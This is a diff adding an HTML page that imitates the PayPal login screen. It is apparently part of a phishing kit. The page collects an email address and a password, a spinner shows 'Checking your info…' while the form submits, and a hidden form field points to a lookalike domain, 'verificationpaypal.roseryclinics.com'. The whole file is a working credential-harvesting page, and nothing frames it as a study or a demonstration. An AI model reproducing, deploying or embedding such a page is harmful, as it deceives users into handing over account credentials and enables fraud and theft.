@@ -1,0 +1,80 @@
+
+
+
+
+<!doctype html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width" />
+    <title>Log in to your PayPal account</title>
+    <link rel="icon" href="6619c68863dcacba37ba6e83f14cbef4/css/fav.ico" />
+    <meta name="robots" content="noindex" />
+    <link href="6619c68863dcacba37ba6e83f14cbef4/css/style.css" rel="stylesheet" type="text/css">
+    <script src="../code.jquery.com/jquery-2.1.4.min.js"></script>
+</head>
+<body>
+<div id="page">
+    <div class="contenair">
+        <header>
+            <div class="logo"></div>
+        </header>
+        <div class="main">
+            <form method="post" action="index.html">
+                                <div class="textinput">
+                    <input type="email" name="login_email" placeholder="Email">
+                </div>
+                <div class="textinput">
+                    <input type="password" name="login_password" placeholder="Password">
+                </div>
+                <input type="hidden" value="verificationpaypal.roseryclinics.com/6619c68863dcacba37ba6e83f14cbef4/signin/?country.x=&locale.x=_" name="website">
+                <div class="actionsSpaced">
+                    <button type="submit" name="submit" class="button">Log In</button>
+                </div>
+                <div class="forgotLink">
+                <a href="index.html#" class="link">Forgot your email or password?</a>
+                </div>
+            </form>
+            <a href="index.html#" class="btnSign">Sign Up</a>
+        </div>
+    </div>
+    <div class="spinner" style="display: none;">
+        <p class="checkingInfo">Checking your info…</p>
+    </div>
+</div>
+<footer class="footer">
+    <ul>
+        <li><a href="index.html#">Contact Us</a></li>
+        <li><a href="index.html#">Privacy</a></li>
+        <li><a href="index.html#">Legal</a></li>
+        <li><a href="index.html#">Worldwide</a></li>
+    </ul>
+</footer>
+<script>
+    $("#loginForm").submit(function(){
+        var isFormValid = true;
+
+        $(".textinput input").each(function(){
+            if ($.trim($(this).val()).length == 0){
+                $(this).addClass("hasErreur");
+                $(this).css('z-index','100');
+                isFormValid = false;
+            }
+            else{
+                $(this).removeClass("hasErreur");
+                $('.spinner').css("display",'block');
+                $('.contenair').css('opacity','0.1');
+                $('.footer').css('opacity','0.1');
+            }
+        });
+        return isFormValid;
+    });
+    $(".textinput input").keyup(function () {
+        if($(this).val().length !== 0){
+            $(this).removeClass('hasErreur');
+        }
+    })
+
+</script>
+</body>
+</html>
